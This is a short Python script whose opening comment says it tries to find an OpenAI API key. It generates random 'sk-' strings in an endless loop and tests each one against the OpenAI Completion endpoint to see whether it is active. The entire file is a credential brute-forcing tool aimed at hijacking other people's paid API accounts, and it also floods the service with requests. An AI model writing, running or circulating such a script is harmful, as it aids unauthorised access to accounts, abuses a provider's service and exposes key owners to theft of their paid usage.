#code tries to find openai api key
import random
import string
import openai
import time

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def generate_api_key():
    prefix = "sk-"
    suffix_length = 47
    suffix = generate_random_string(suffix_length)
    return prefix + suffix

# Generate a random API key with a similar pattern


def is_api_key_active(api_key):
    openai.api_key = api_key

    while True:
        try:
            openai.Completion.create(
                engine="davinci",
                prompt="Hello, World!",
                max_tokens=5
            )
            return True
        except openai.OpenAIError as e:
            if "Invalid API key" in str(e):
                return False
            else:
                print("Error occurred:", str(e))
                time.sleep(1)  # Wait for a second before retrying
while True:
    api_key = generate_api_key()
    is_active = is_api_key_active(api_key)
    if is_active:
        print("API key is active.")
    else:
        print("API key is not active.")


#
